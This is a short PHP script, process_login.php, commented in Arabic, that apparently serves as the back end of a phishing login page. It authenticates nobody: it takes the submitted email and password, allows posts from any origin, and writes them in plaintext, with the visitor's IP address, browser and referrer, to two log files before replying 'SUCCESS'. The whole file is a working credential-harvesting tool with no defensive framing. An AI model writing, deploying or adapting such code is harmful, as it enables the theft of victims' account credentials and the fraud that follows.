<?php
// process_login.php - معالجة البريد الإلكتروني وكلمة المرور
date_default_timezone_set('Asia/Riyadh');
header('Content-Type: text/html; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    if ($email && $password) {
        $file = 'logins.txt';
        
        // جمع المعلومات
        $user_ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $timestamp = date('Y-m-d H:i:s');
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';
        
        // تنسيق البيانات
        $data = "════════════════════════════════════════\n";
        $data .= "📧 البريد: $email\n";
        $data .= "🔑 كلمة المرور: $password\n";
        $data .= "🕐 التاريخ: $timestamp\n";
        $data .= "🌐 IP: $user_ip\n";
        $data .= "🔍 المتصفح: $user_agent\n";
        $data .= "📎 المرجع: $referer\n";
        $data .= "════════════════════════════════════════\n\n";
        
        // حفظ البيانات
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
            // تسجيل إضافي
            $log_entry = "$timestamp | EMAIL: $email | PASS: $password | IP: $user_ip\n";
            file_put_contents('access_log.txt', $log_entry, FILE_APPEND | LOCK_EX);
            
            echo "SUCCESS";
        } else {
            echo "ERROR_SAVING";
        }
        
    } else {
        http_response_code(400);
        echo "MISSING_DATA";
    }
} else {
    http_response_code(405);
    echo "METHOD_NOT_ALLOWED";
}
?>